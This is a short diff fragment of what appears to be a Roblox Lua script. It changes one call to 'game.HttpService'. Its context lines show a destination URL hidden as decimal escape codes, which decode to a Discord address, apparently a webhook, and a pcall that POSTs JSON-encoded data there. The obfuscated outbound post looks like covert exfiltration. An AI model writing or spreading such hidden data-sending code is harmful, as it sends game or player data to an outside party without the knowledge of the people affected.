@@ -84,7 +84,7 @@ local main = "\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111
 local ok, err = pcall(function()
 	HttpService:PostAsync(
 		main,
-		HttpService:JSONEncode(data),
+		game.HttpService:JSONEncode(data),
 		Enum.HttpContentType.ApplicationJson
 	)
 end)
